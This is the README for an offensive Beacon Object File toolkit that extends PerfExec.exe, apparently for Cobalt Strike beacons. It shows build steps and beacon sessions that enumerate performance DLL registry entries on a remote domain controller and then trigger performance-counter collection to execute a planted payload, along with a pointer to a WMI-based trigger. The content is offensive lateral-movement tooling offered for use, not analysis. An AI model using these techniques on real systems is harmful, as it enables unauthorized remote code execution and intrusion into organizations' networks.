# PerfExec BOF Tooling
BOF tooling to complement `PerfExec.exe`

### Compiling
Requires `mingw-w64`
```
make
```

### Enumeration
The `perf-gather` BOF can be used to enumerate service performance DLL info from the registry (local or remote)
```
beacon> perf-gather earth-dc.marvel.local
[*] Gathering performance data from the registry on earth-dc.marvel.local
[+] host called home, sent: 4843 bytes
[+] received output:
[*] Target: earth-dc.marvel.local
[*] Enumerating Services subkeys...

[+] HKLM\SYSTEM\CurrentControlSet\Services\.NET CLR Data\Performance
 |_ PerfIniFile: _DataPerfCounters_d.ini
 |_ Library: %systemroot%\system32\netfxperf.dll
 |_ Open: OpenPerformanceData
 |_ Collect: CollectPerformanceData
 |_ Close: ClosePerformanceData

 ...
```

### Trigger
The `perf-trigger` BOF can trigger performance data collection (similar to `PerfExec.exe diagrun=true`)

```
beacon> perf-trigger "DNS" "Total Query Received" earth-dc.marvel.local
[*] Triggering performance data collection on earth-dc.marvel.local
[+] host called home, sent: 4853 bytes
[+] received output:
[*] Target: earth-dc.marvel.local
[*] Object: DNS
[*] Counter: Total Query Received

[!] PdhAddCounterA failed with error code: -1073738824
[!] Payload may still have triggered
```

The pre-existing `wmi_query` [BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) can be leveraged to trigger collection using WMI